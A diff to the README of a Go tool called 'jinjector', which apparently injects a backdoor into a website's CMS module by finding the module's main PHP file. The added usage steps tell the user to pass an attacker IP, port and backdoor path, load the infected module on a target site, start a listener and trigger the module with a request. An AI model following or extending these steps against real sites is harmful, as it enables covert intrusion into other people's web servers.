@@ -29,8 +29,13 @@ go build -o jinjector
 ```
 
 ## 🚀 Usage
-<img src="https://github.com/user-attachments/assets/ddac7eea-03bf-457b-a42e-8abc44daf2f1" alt="Screenshot"/>
-Start the program, enter your ip, your port and the module path
+1. Run the program 
+```
+jinjector --ip=YOUR_IP --port=YOUR_PORT --path=YOUR_PATH --backdoor=BACKDOOR_PATH
+```
+2. Load the infected module on the target site 
+3. Start an http client on the port your gave in the previous step
+4. Trigger the module by sendign a request to its position
 
 ## 🌍 How It Works 
 **Manifest Extraction**: Jinjector parses the XML file in the given module directory to identify the main PHP file.
